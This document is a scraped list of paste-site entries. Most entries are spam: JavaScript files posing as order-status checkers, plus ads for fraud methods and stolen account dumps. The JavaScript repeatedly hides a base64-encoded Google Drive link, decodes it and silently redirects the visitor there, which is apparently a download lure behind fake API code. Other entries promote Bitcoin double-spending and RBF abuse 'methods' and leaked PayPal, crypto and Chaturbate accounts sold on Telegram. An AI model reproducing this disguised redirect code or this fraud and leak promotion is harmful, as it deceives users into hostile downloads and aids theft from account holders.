id,title,username,language,date,content
Yf0ffgxU,Order.js,hubertzoo90,JavaScript,Saturday 3rd of May 2025 05:45:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/78728/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fuhy26cf,Abuse RBF in BTC transactions,x2LeaF,JavaScript,Saturday 3rd of May 2025 05:30:50 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 28515
1P8TuLmj,Chaturbate with Tokens,jm33,JavaScript,Saturday 3rd of May 2025 05:30:31 PM CDT,89015 Accounts Posted On https://t.me/leakzbyeminem
tKs9arqu,Market.js,hubertzoo90,JavaScript,Saturday 3rd of May 2025 05:30:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47987/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NiXAJqB6,Midway Dialing Program,oswald_the_void,Lua,Saturday 3rd of May 2025 05:24:07 PM CDT,"--this is a midway program ment to go into the end
local gate_1 = peripheral.wrap(""crystal_interface_27"") --modify to the milkyway gate in the end
local gate_2 = peripheral.wrap(""crystal_interface_26"") --modify to the pegasus gate in the end
--since only you know how many interfaces you used in total

local lantea_address = {29,5,17,34,6,12,0} -- Replace with Lantea
local return_address = {27,25,4,35,10,28,0} -- Replace with return or home

local last_feedback_1 = nil
local last_feedback_2 = nil

-- Function to dial a gate
local function dialAddress(gate, address)
    print(""Dialing: "" .. table.concat(address, ""-""))
    for _, symbol in ipairs(address) do
        gate.engageSymbol(symbol)
        os.sleep(0.5)
    end
end

local feedback = 0
if gate_2 then
    local ok, result 
    if ok then
        feedback = result
    else
        print(""Pegasus gate feedback error:"", result)
    end
else
    print(""Pegasus gate is nil during check."")
end

-- Function to check and return new feedback
local function checkNewFeedback(gate, last_feedback)
    local feedback = gate.getRecentFeedback()
    if feedback ~= last_feedback then
        return feedback
    end
    return nil
end

print(""Midway relay system running..."")

while true do
    local feedback_1 = checkNewFeedback(gate_1, last_feedback_1)
    local feedback_2 = checkNewFeedback(gate_2, last_feedback_2)

    if feedback_1 then
        last_feedback_1 = feedback_1
        print(""Gate 1 Feedback:"", feedback_1)

        if feedback_1 == -30 then
            print(""Incoming wormhole detected on Gate 1. Dialing Lantea from Gate 2..."")
            dialAddress(gate_2, lantea_address)
        elseif feedback_1 == 7 then
            print(""Gate 1 disconnected."")
        end
    end

    if feedback_2 then
        last_feedback_2 = feedback_2
        print(""Gate 2 Feedback:"", feedback_2)

        if feedback_2 == -30 then
            print(""Incoming wormhole detected on Gate 2. Dialing return address from Gate 1..."")
            dialAddress(gate_1, return_address)
        elseif feedback_2 == 7 then
            print(""Gate 2 disconnected."")
        end
    end

    os.sleep(0.2)
end
"
Nnm6G0H0,Rosie's first Ghost build after🤍☠️👻,RebelRose,Bash,Saturday 3rd of May 2025 05:20:59 PM CDT,"Rosie install after Ghost with first recipes including the anonymous 
Bash from Spade.......
..............................."
fvpwzNGU,Stake Free Balance Method,x2LeaF,JavaScript,Saturday 3rd of May 2025 05:15:28 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 64265
A3C25LPD,Crypto Accounts,jm33,JavaScript,Saturday 3rd of May 2025 05:15:07 PM CDT,34372 Accounts Posted On https://t.me/leakzbyeminem
qpzfU8vh,Untitled,hubertzoo90,JavaScript,Saturday 3rd of May 2025 05:15:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72898/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rJ2xhVKJ,Stake Free Balance Method,hubertzoo90,JavaScript,Saturday 3rd of May 2025 05:00:02 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 30676
Xz5Xbwf2,PayPal with Balance,jm33,JavaScript,Saturday 3rd of May 2025 04:59:46 PM CDT,34585 Accounts Posted On https://t.me/leakzbyeminem
jVFFsXfn,Doublespending using Vanity Wallet,jm33,JavaScript,Saturday 3rd of May 2025 04:44:37 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 74999
v53EL5Rw,Chaturbate with Tokens,zebmekey,JavaScript,Saturday 3rd of May 2025 04:44:19 PM CDT,13284 Accounts Posted On https://t.me/leakzbyeminem
h8Hb4gTe,Order.js,zebmekey,JavaScript,Saturday 3rd of May 2025 04:44:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45882/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UKA11K7j,Abuse RBF in BTC transactions,jm33,JavaScript,Saturday 3rd of May 2025 04:29:15 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 20578
xs8iB6ab,Crypto Accounts,zebmekey,JavaScript,Saturday 3rd of May 2025 04:28:57 PM CDT,29904 Accounts Posted On https://t.me/leakzbyeminem
zUft74cR,Market.js,zebmekey,JavaScript,Saturday 3rd of May 2025 04:28:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36983/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ud6h5sZ5,Untitled,tuningred,JavaScript,Saturday 3rd of May 2025 04:16:44 PM CDT," <script type=""text/javascript"">
        var JUSsJ_hrH_yHVTZc={""it"":4411324,""key"":""6dffb""};
    </script>
    <script src=""https://d2yc6hxtq0phup.cloudfront.net/91c0f2c.js""></script>"
1RLn1Wn5,Stake Free Balance Method,jm33,JavaScript,Saturday 3rd of May 2025 04:13:53 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 70953
